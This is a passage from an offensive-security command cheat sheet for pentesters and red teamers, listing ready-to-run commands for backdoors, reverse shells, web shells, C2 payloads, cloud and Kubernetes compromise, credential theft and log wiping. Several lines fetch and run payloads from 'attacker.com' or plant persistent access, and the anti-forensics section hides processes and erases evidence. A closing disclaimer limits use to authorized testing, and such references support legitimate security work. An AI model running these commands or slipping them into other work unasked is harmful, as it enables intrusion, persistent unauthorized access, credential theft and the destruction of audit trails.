# SSH persistence
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys
# Use: SSH keys - adds attacker's SSH key

useradd -r -s /bin/bash -G sudo backdooruser
echo 'backdooruser:Password123!' | chpasswd
# Use: Backdoor user - creates hidden user account

# PAM backdoor
echo "auth sufficient pam_exec.so quiet /tmp/backdoor.sh" >> /etc/pam.d/sshd
# Use: PAM module - authentication bypass through PAM
```

### Network Persistence
```bash
# Netcat backdoors
nc -lvp 4444 -e /bin/bash
# Use: Simple backdoor - netcat listener with shell

while true; do nc -lvp 4444 -e /bin/bash; done
# Use: Persistent backdoor - automatically restarts

# Socat backdoors
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# Use: Advanced backdoor - more reliable than netcat

# Web shells
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
# Use: PHP web shell - command execution through web

echo '<%@ Page Language="C#" %>...' > C:\inetpub\wwwroot\backdoor.aspx
# Use: ASP.NET shell - Windows web server backdoor

echo '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>' > /opt/tomcat/webapps/ROOT/backdoor.jsp
# Use: JSP shell - Java application backdoor
```

---

## 10. Command & Control

### Cobalt Strike
```bash
# Beacon configuration
set payload windows/beacon_http/reverse_http
set host 10.10.10.10
set port 80
set sleeptime 30000
set jitter 20
# Use: HTTP C2 - standard HTTP command and control

set payload windows/beacon_dns/reverse_dns
set dns_beacon dns1.domain.com
# Use: DNS C2 - covert communication through DNS

set payload windows/beacon_smb/bind_pipe
set pipename msagent_##
# Use: SMB C2 - peer-to-peer communication

# Post-exploitation commands
beacon> elevate svc-exe
# Use: Privilege escalation - various escalation methods

beacon> inject 1234 x64 tcp
# Use: Process injection - injects into other processes

beacon> make_token DOMAIN\User Password123
# Use: Token manipulation - creates new tokens

beacon> jump psexec64 10.10.10.5
# Use: Lateral movement - moves to other systems

beacon> persistence schtasks-backdoor
# Use: Persistence - various persistence mechanisms

beacon> logonpasswords
# Use: Credential harvesting - dumps credentials

beacon> portscan 10.10.10.0/24 445,3389,5985
# Use: Network reconnaissance - scans internal network
```

### Metasploit Framework
```bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o payload.exe
# Use: Windows payload - creates Windows executable

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o payload.dll
# Use: DLL payload - creates DLL for injection

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o payload.elf
# Use: Linux payload - creates ELF binary

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o payload.php
# Use: PHP payload - creates web shell

# Handler setup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"
# Use: Multi-handler - handles incoming connections

# Meterpreter commands
meterpreter> sysinfo
# Use: System information - gets target system info

meterpreter> getuid
# Use: User context - shows current user

meterpreter> getsystem
# Use: Privilege escalation - attempts to get SYSTEM

meterpreter> migrate 1234
# Use: Process migration - moves to stable process

meterpreter> download file.txt
# Use: File download - downloads files from target

meterpreter> upload malicious.exe C:\\Windows\\Temp\\
# Use: File upload - uploads files to target

meterpreter> run post/windows/gather/win_privs
# Use: Post modules - runs post-exploitation modules

meterpreter> load kiwi
# Use: Kiwi extension - loads Mimikatz functionality

meterpreter> run persistence -X -i 30 -p 443 -r 10.10.10.10
# Use: Persistence - creates persistent agent
```

### Custom C2 Frameworks
```bash
# Sliver C2
sliver generate --mtls 10.10.10.10 --os windows --arch amd64 --save payload.exe
# Use: Cross-platform implants - generates various payloads

sliver http --domain example.com --website /var/www/html
# Use: HTTP C2 - web-based command and control

sliver implants --build
# Use: Implant management - builds and manages implants

sliver sessions -i
# Use: Session management - lists active sessions

sliver use ABC123
# Use: Session interaction - switches to specific session

# Empire
(Empire: listeners) > set Host http://10.10.10.10:80
(Empire: listeners) > execute
# Use: Listener setup - configures C2 listeners

(Empire: stagers) > set Listener http
(Empire: stagers) > set OutFile /tmp/launcher.exe
(Empire: stagers) > execute
# Use: Stager generation - creates initial payloads

(Empire: agents) > interact ABC123
(Empire: ABC123) > shell whoami
# Use: Agent interaction - executes commands on agents
```

### Covert Channels & Communication
```bash
# DNS tunneling
sudo ruby dnscat2.rb --dns domain=attacker.com --secret=MySecret
# Use: DNS C2 - command and control through DNS

dnscat2.exe --dns server=attacker.com --secret=MySecret
# Use: DNS client - connects to DNS tunneling server

# ICMP tunneling
ptunnel-ng -x password -p 22 -l 2222
# Use: ICMP C2 - tunnels traffic through ICMP

# HTTP tunneling
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.aspx
# Use: HTTP proxy - creates SOCKS proxy through web shell

# Chisel tunneling
./chisel server -p 8080 --reverse
# Use: TCP tunneling - versatile TCP/UDP tunneling

./chisel client 10.10.10.10:8080 R:1080:socks
# Use: SOCKS proxy - creates proxy through tunnel

# SSH tunneling
ssh -D 1080 -p 22 user@target_ip
# Use: Dynamic forwarding - SOCKS proxy through SSH

ssh -L 8080:internal_host:80 user@target_ip
# Use: Local forwarding - forwards local port to remote

ssh -R 2222:127.0.0.1:22 user@attacker_ip
# Use: Remote forwarding - exposes local service to remote
```

---

## 11. Cloud Security

### AWS Exploitation
```bash
# AWS reconnaissance
aws sts get-caller-identity
# Use: Identity check - shows current AWS identity

aws iam list-users
aws iam list-roles
aws iam list-groups
# Use: IAM enumeration - lists users, roles, and groups

aws ec2 describe-instances
aws ec2 describe-security-groups
# Use: EC2 enumeration - lists instances and security groups

aws s3 ls
aws s3api list-buckets
# Use: S3 enumeration - lists S3 buckets

# Pacu framework
run aws__enumeration
# Use: Automated enumeration - comprehensive AWS recon

run iam__privesc_scan
# Use: Privilege escalation - finds IAM escalation paths

run iam__backdoor_users
# Use: Backdoor creation - creates backdoor IAM users

# AWS privilege escalation
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Use: User creation - creates admin user

aws iam update-assume-role-policy --role-name target-role --policy-document file://trust-policy.json
# Use: Role modification - changes role trust policies

# Lambda backdoors
aws lambda create-function --function-name BackdoorFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip
# Use: Lambda persistence - creates malicious Lambda function

# S3 exploitation
aws s3 ls s3://target-bucket/ --no-sign-request
# Use: Public buckets - lists publicly accessible buckets

aws s3 sync s3://target-bucket/ ./local-folder/ --no-sign-request
# Use: Data exfiltration - downloads bucket contents

aws s3 cp malicious-file.txt s3://target-bucket/
# Use: Data injection - uploads files to buckets

# CloudTrail evasion
aws cloudtrail stop-logging --name trail-name
# Use: Log disabling - stops CloudTrail logging

aws cloudtrail delete-trail --name trail-name
# Use: Trail deletion - removes CloudTrail configuration

# Metadata exploitation
curl http://169.254.169.254/latest/meta-data/
# Use: Instance metadata - gets EC2 instance metadata

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Use: IAM roles - lists available IAM roles

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# Use: Temporary credentials - gets role credentials
```

### Azure AD Attacks
```bash
# Azure AD reconnaissance
Connect-AzureAD
# Use: Azure connection - connects to Azure Active Directory

Get-AzureADUser -All $true | Select-Object DisplayName, UserPrincipalName
# Use: User enumeration - lists Azure AD users

Get-AzureADDirectoryRole | ForEach-Object {Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId}
# Use: Role enumeration - lists role members

Get-AzureADApplication -All $true
Get-AzureADServicePrincipal -All $true
# Use: App enumeration - lists applications and service principals

# MicroBurst framework
Get-AzurePasswords -Verbose
# Use: Credential harvesting - attempts password extraction

Invoke-EnumerateAzureBlobs -Base company
# Use: Storage enumeration - finds Azure storage accounts

# Azure privilege escalation
Add-AzureADRoleMember -ObjectId "role-id" -RefObjectId "user-id"
# Use: Role assignment - adds users to Azure AD roles

New-AzureADServicePrincipal -DisplayName "BackdoorApp"
# Use: Service principal - creates backdoor application

# Runbook persistence
Import-AzAutomationRunbook -Name "BackdoorRunbook" -Path "C:\backdoor.ps1" -AutomationAccountName "Account" -ResourceGroupName "RG" -Type PowerShell
# Use: Automation persistence - creates malicious runbooks

# Function app backdoors
az functionapp create --name BackdoorFunction --storage-account mystorageaccount --resource-group myResourceGroup --consumption-plan-location westus
# Use: Function persistence - creates Azure Functions

# Storage exploitation
az storage account list --resource-group myResourceGroup
# Use: Storage enumeration - lists storage accounts

az storage container list --account-name mystorageaccount --account-key mykey
# Use: Container enumeration - lists storage containers

az storage blob download --account-name mystorageaccount --container-name mycontainer --name myblob --file ./localfile
# Use: Blob access - downloads files from blob storage

# Metadata service
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Use: Azure metadata - gets Azure VM metadata

curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"
# Use: Managed identity - gets access tokens for managed identities
```

### Kubernetes Security
```bash
# Kubernetes reconnaissance
kubectl get pods --all-namespaces
# Use: Pod discovery - lists all pods

kubectl get secrets --all-namespaces
# Use: Secret enumeration - lists Kubernetes secrets

kubectl get configmaps --all-namespaces
# Use: ConfigMap enumeration - lists configuration maps

kubectl get services --all-namespaces
# Use: Service discovery - lists services

kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces
kubectl get clusterroles
kubectl get clusterrolebindings
# Use: RBAC enumeration - lists roles and bindings

kubectl auth can-i --list
# Use: Permission check - shows current user permissions

# Kubernetes privilege escalation
kubectl create rolebinding privileged-role-binding --user=system:serviceaccount:default:default --clusterrole=cluster-admin
# Use: Role binding - grants cluster-admin to service account

kubectl patch pod my-pod -p '{"spec":{"containers":[{"name":"my-container","image":"alpine","command":["/bin/sh"],"args":["-c","curl http://attacker.com/shell.sh | sh"]}]}}'
# Use: Pod modification - changes pod specification

kubectl exec -it my-pod -- /bin/bash
# Use: Pod execution - executes commands in pods

# Kubernetes backdoors
kubectl create secret generic backdoor-secret --from-literal=token=supersecret
# Use: Secret creation - stores backdoor data

kubectl create cronjob backdoor-job --image=alpine --schedule="*/5 * * * *" -- /bin/sh -c "curl http://attacker.com/payload.sh | sh"
# Use: CronJob persistence - creates scheduled jobs

# Container escape
docker run --privileged -v /:/host -it alpine chroot /host /bin/sh
# Use: Privileged escape - escapes privileged containers

docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
# Use: Docker socket - controls host Docker daemon

docker run --cap-add=ALL -v /:/host -it alpine chroot /host /bin/sh
# Use: Capabilities escape - uses container capabilities

kubectl debug node/node-name -it --image=alpine
# Use: Node debug - escapes to host through node debugging
```

---

## 12. Container Security

### Container Vulnerability Scanning
```bash
# Trivy
trivy image alpine:3.12
# Use: Image scanning - checks container images for vulnerabilities

trivy filesystem --security-checks vuln,secret /
# Use: Filesystem scanning - checks local filesystem

trivy kubernetes --report summary all
# Use: Kubernetes scanning - scans Kubernetes clusters

# Falco
falco -r rules.yaml -o file_output.enabled=true
# Use: Runtime security - monitors container behavior

# Kube-hunter
kube-hunter --remote target.com
# Use: Kubernetes pentesting - tests Kubernetes security

kube-hunter --active --cidr 10.0.0.0/8
# Use: Network scanning - scans for Kubernetes services
```

### Container Runtime Security
```bash
# Docker security assessment
docker image ls
# Use: Image listing - shows available images

docker ps -a
# Use: Container listing - shows running and stopped containers

docker network ls
# Use: Network listing - shows Docker networks

# Container breakout testing
docker run --privileged --security-opt apparmor:unconfined --cap-add=ALL -it ubuntu bash
# Use: Privileged container - tests privilege escalation

# Runtime hardening checks
docker info --format '{{.SecurityOptions}}'
# Use: Security options - shows Docker security configuration
```

---

## 13. Mobile & Wireless

### Wireless Attacks
```bash
# Aircrack-ng suite
airmon-ng start wlan0
# Use: Monitor mode - enables wireless monitoring

airmon-ng check kill
# Use: Process killing - stops interfering processes

airodump-ng wlan0mon
# Use: Network discovery - finds nearby wireless networks

airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Use: Targeted capture - captures specific network traffic

aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Use: Deauthentication - forces clients to reconnect

aircrack-ng -w wordlist.txt capture-01.cap
# Use: WPA cracking - cracks WPA handshakes

# WPA3 & advanced attacks
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Use: PMKID capture - captures without deauthentication

hcxpcaptool -z hashes.txt capture.pcapng
# Use: Hash extraction - extracts hashes from capture

hashcat -m 22000 hashes.txt wordlist.txt
# Use: PMKID cracking - cracks PMKID hashes

# Evil twin attacks
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "Free WiFi" -c 6 wlan0mon
# Use: Rogue AP - creates fake access point

# BetterCAP wireless
bettercap -iface wlan0
wifi.recon on
wifi.show
# Use: Wireless recon - discovers networks

set wifi.deauth.essid TargetNetwork
wifi.deauth
# Use: Targeted deauth - deauthenticates from specific network
```

### Mobile Application Testing
```bash
# Objection
objection -g com.app.name explore
# Use: Runtime analysis - injects into mobile apps

ios keychain dump
# Use: iOS keychain - extracts keychain entries

android keystore list
# Use: Android keystore - lists keystore entries

android hooking watch class_method com.app.Class.method --dump-args --dump-return
# Use: Method hooking - monitors method calls

# Frida
frida -U -f com.app.name -l script.js --no-pause
# Use: Dynamic instrumentation - injects Frida scripts

# MobSF
python3 manage.py runserver 0.0.0.0:8000
# Use: Web interface - runs MobSF for static analysis

curl -X POST -F "file=@app.apk" http://localhost:8000/api/v1/upload
# Use: API usage - uploads apps via API

# APKTool & reverse engineering
apktool d app.apk -o decompiled/
# Use: APK decompilation - decompiles to smali code

apktool b decompiled/ -o modified.apk
# Use: APK repackaging - rebuilds modified APK

jadx -d decompiled/ app.apk
# Use: Java decompilation - decompiles to Java source

# APK signing
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore modified.apk alias_name
# Use: APK signing - signs APKs for installation
```

### Bluetooth Attacks
```bash
# Bluetooth reconnaissance
hcitool scan
# Use: Device discovery - finds nearby Bluetooth devices

hcitool inq
# Use: Extended discovery - performs device inquiry

bluetoothctl
# Use: Bluetooth control - interactive management

sdptool browse AA:BB:CC:DD:EE:FF
# Use: Service discovery - lists Bluetooth services

# Bluetooth sniffing
ubertooth-btle -f -r capture.pcap
# Use: BLE sniffing - captures BLE communications

hcidump -Xt
# Use: HCI capture - captures Host Controller Interface

# Bluetooth exploitation
python blueborne.py -t AA:BB:CC:DD:EE:FF
# Use: BlueBorne - exploits BlueBorne vulnerabilities

l2ping -s 1000 -f AA:BB:CC:DD:EE:FF
# Use: L2CAP ping - sends ping packets

btcrack AA:BB:CC:DD:EE:FF capture.cap wordlist.txt
# Use: PIN cracking - cracks Bluetooth PINs

gatttool -b AA:BB:CC:DD:EE:FF -I
connect
char-read-hnd 0x000c
# Use: GATT interaction - interacts with GATT services
```

---

## 14. API Security

### API Testing Tools
```bash
# RESTler
python3 restler.py --api_spec openapi.json --target_ip 10.10.10.10 --target_port 443
# Use: API fuzzing - automated API testing with grammar

# APIsec
apisec scan --config apisec-config.yaml --url https://api.target.com
# Use: Automated scanning - comprehensive API security testing

# Schemathesis
st run --checks all https://api.target.com/openapi.json
# Use: Property-based testing - generates test cases from schema
```

### Advanced API Attacks
```bash
# GraphQL advanced testing
python3 graphql-cop -t https://target.com/graphql
# Use: GraphQL security - comprehensive GraphQL testing

# API abuse testing
for i in {1..1000}; do curl -X POST https://api.target.com/endpoint -d "data=test$i"; done
# Use: Rate limit testing - checks API rate limiting

# JWT advanced attacks
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt
# Use: JWT cracking - brute forces JWT secrets
```

---

## 15. DevSecOps Tools

### SAST & Code Analysis
```bash
# Semgrep
semgrep --config=auto .
# Use: Code scanning - finds bugs and vulnerabilities

semgrep --config=p/ci .
# Use: CI integration - security scanning for CI/CD

# Grype
grype alpine:latest
# Use: Vulnerability scanning - container image analysis

grype dir:.
# Use: Directory scanning - local filesystem analysis

# Syft
syft alpine:latest -o json
# Use: SBOM generation - software bill of materials

syft dir:. -o cyclonedx
# Use: SBOM formats - generates in various formats
```

### IaC Security
```bash
# Checkov
checkov -d .
# Use: Infrastructure scanning - checks CloudFormation, Terraform

checkov -f cloudformation.yaml
# Use: CloudFormation scanning - AWS template security

# Terrascan
terrascan scan
# Use: Terraform scanning - IaC security analysis

# TFsec
tfsec .
# Use: Terraform security - specialized Terraform scanning
```

---

## 16. ICS/SCADA Security

### Industrial Control Systems
```bash
# s7scan
python3 s7scan.py -t 10.10.10.10
# Use: Siemens S7 - scans Siemens S7 PLCs

# modscan
python3 modscan.py -t 10.10.10.10
# Use: Modbus scanning - finds Modbus devices

# ISF (Industrial Exploitation Framework)
use scanners/scanner/siemens/s7_comm
set RHOSTS 10.10.10.0/24
run
# Use: Industrial pentesting - exploits industrial protocols
```

---

## 17. Zero Trust & Modern Security

### Zero Trust Testing
```bash
# ZTNA testing
python3 ztna_tester.py --domain company.com --api-key $API_KEY
# Use: Zero Trust assessment - tests ZTNA implementations

# Service Mesh security
istioctl analyze
# Use: Istio analysis - checks Istio configuration

istioctl experimental authz check
# Use: Authorization checking - verifies authz policies

# SPIFFE/SPIRE testing
spire-agent api fetch x509
# Use: SPIFFE verification - tests SPIFFE implementation
```

---

## 18. AI/ML Security

### AI/ML Security Testing
```bash
# Counterfit
counterfit scan --target model.zip
# Use: Adversarial attacks - tests ML model security

# MLSecOps
python3 model_scanner.py --model model.h5 --framework tensorflow
# Use: Model scanning - checks ML models for vulnerabilities

# Data poisoning detection
python3 data_poisoning_detector.py --dataset data.csv
# Use: Data integrity - detects poisoned training data
```

---

## 19. Anti-Forensics

### Log Manipulation
```bash
# Linux log cleaning
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
# Use: Basic clearing - empties log files

sed -i '/10.10.10.10/d' /var/log/apache2/access.log
# Use: Selective removal - deletes specific entries

logrotate -f /etc/logrotate.conf
# Use: Log rotation - forces log rotation

journalctl --vacuum-time=1s
# Use: Journal cleaning - removes journal entries

# Windows log manipulation
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# Use: Event log clearing - clears Windows event logs

net stop eventlog
net start eventlog
# Use: Service restart - restarts event log service

# Web server logs
echo "" > /var/log/apache2/access.log
echo "" > /var/log/nginx/access.log
# Use: Web log clearing - clears web server logs
```

### File Timestamp Manipulation
```bash
# Linux timestamps
touch -r /bin/ls malicious_file
# Use: Reference copying - copies timestamp from legit file

touch -t 202001010000 malicious_file
# Use: Specific timestamp - sets exact timestamp

find /tmp -name "malicious*" -exec touch -t 202001010000 {} \;
# Use: Bulk modification - changes multiple file timestamps

# Windows timestamps
(Get-Item malicious.exe).CreationTime = '01/01/2020 00:00:00'
# Use: PowerShell modification - changes file timestamps

copy /b malicious.exe +,,
# Use: CMD modification - updates file timestamp
```

### Artifact Removal
```bash
# Browser history
rm -rf ~/.config/google-chrome/Default/History
rm -rf ~/.mozilla/firefox/*.default/places.sqlite
# Use: Browser cleaning - removes browsing history

# System artifacts
echo "" > ~/.bash_history
history -c
# Use: Command history - clears shell history

rm -rf /tmp/malicious*
rm -rf /var/tmp/suspicious*
# Use: Temp file cleaning - removes temporary files

# Windows artifacts
Remove-Item C:\Windows\Prefetch\*.pf -Force
# Use: Prefetch cleaning - deletes prefetch files

Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
# Use: Jump list cleaning - clears recent documents
```

### Memory Forensics Evasion
```bash
# Process hiding
echo "/tmp/malicious_lib.so" > /etc/ld.so.preload
# Use: Library preloading - hooks system calls

unshare -m --propagation private
# Use: Namespace isolation - creates private mount namespace

cp /bin/bash /tmp/.hidden_process
exec -a "[kworker/0:0]" /tmp/.hidden_process
# Use: Process spoofing - masquerades as system process

# Rootkit techniques
insmod rootkit.ko
# Use: Kernel module - loads hiding kernel module

# Anti-forensic tools
bleachbit --preset
# Use: System cleaning - comprehensive artifact removal

sdelete -p 3 -s C:\sensitive-file.txt
# Use: Secure deletion - overwrites files before deletion
```

---

## 20. Password Attacks

### Hash Cracking
```bash
# Hashcat
hashcat -m 1000 hashes.txt -a 0 rockyou.txt -r rules/best64.rule
# Use: NTLM cracking - cracks Windows hashes with rules

hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d?d?d
# Use: Brute force - digit-based brute force

hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# Use: WPA cracking - brute forces WPA passwords

hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
# Use: Kerberoasting - cracks service account hashes

# John the Ripper
john --format=raw-md5 hashes.txt --wordlist=wordlist.txt --rules
# Use: Multi-format - various hash type cracking

john --format=netntlmv2 hashes.txt --fork=4
# Use: Parallel cracking - multi-core processing

john --incremental=Digits hashes.txt
# Use: Incremental mode - digit-based brute force

# Rainbow tables
rtgen md5 loweralpha 1 7 0 3800 33554432 0
# Use: Table generation - creates rainbow tables

rcrack . -l hashes.txt
# Use: Table cracking - uses rainbow tables for fast cracking
```

### Password Spraying
```bash
# Kerbrute
kerbrute passwordspray -d domain.local users.txt Password123
# Use: Kerberos spraying - sprays passwords against Kerberos

kerbrute bruteuser -d domain.local passwords.txt username
# Use: User brute force - targets specific user

# CrackMapExec spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
# Use: SMB spraying - sprays against SMB services

# Custom spraying
python3 sprayer.py -smb -targets targets.txt -users users.txt -passwords passwords.txt
# Use: Multi-protocol - various protocol spraying

# Web application spraying
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Use: Web form spraying - HTTP form credential testing

# O365 spraying
python3 MSOLSpray.py --url https://login.microsoft.com --users users.txt --passwords passwords.txt
# Use: Office 365 - sprays against O365 services

python3 o365spray.py --spray -u users.txt -p 'Company123!' --count 1 --lockout 1
# Use: Lockout aware - spraying with lockout monitoring
```

### Brute Force Attacks
```bash
# Online brute force
hydra -L users.txt -P passwords.txt ssh://10.10.10.10
# Use: SSH brute force - credential testing for SSH

ncrack -U users.txt -P passwords.txt ssh://10.10.10.10:22
# Use: Alternative SSH - uses ncrack for SSH

hydra -l administrator -P passwords.txt rdp://10.10.10.10
# Use: RDP brute force - Remote Desktop credential testing

crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt
# Use: RDP with crowbar - alternative RDP tool

# Offline attacks
fcrackzip -u -D -p passwords.txt archive.zip
# Use: ZIP cracking - brute forces ZIP passwords

pdf2john.pl document.pdf > pdf_hash.txt
john pdf_hash.txt
# Use: PDF cracking - extracts and cracks PDF passwords

office2john.py document.docx > office_hash.txt
john office_hash.txt
# Use: Office cracking - cracks Microsoft Office documents
```

### Credential Stuffing
```bash
# Custom tools
python3 blackwidow.py -t target.com -c cookies.txt -p proxies.txt
# Use: Automated stuffing - uses cookies and proxies

python3 snipr.py -u users.txt -p passwords.txt -t target.com -f login_form
# Use: Form-based - targets specific login forms

AccountChecker.exe -c config.json -u users.txt -p passwords.txt -t 10
# Use: Multi-threaded - high-performance credential checking

# API credential testing
python3 api_tester.py --endpoint https://api.target.com/auth --users users.txt --passwords passwords.txt --method POST
# Use: API stuffing - tests credentials against APIs

python3 jwt_tester.py --tokens tokens.txt --endpoint https://api.target.com/protected
# Use: JWT testing - validates JWT tokens
```

---

## Legal Notice

This document is for educational and authorized security testing purposes only. Always ensure you have explicit permission before using these techniques against any systems.

- Only use on systems you own or have explicit written permission to test
- Maintain detailed logs and documentation for all testing activities
- Follow responsible disclosure practices for any vulnerabilities found
- Understand and comply with local laws and regulations

**Disclaimer**: The maintainers are not responsible for any misuse of this information. Always conduct security testing ethically and legally.

---

*This reference serves as the definitive guide for security professionals, red team operators, penetration testers, and anyone involved in offensive security operations.*
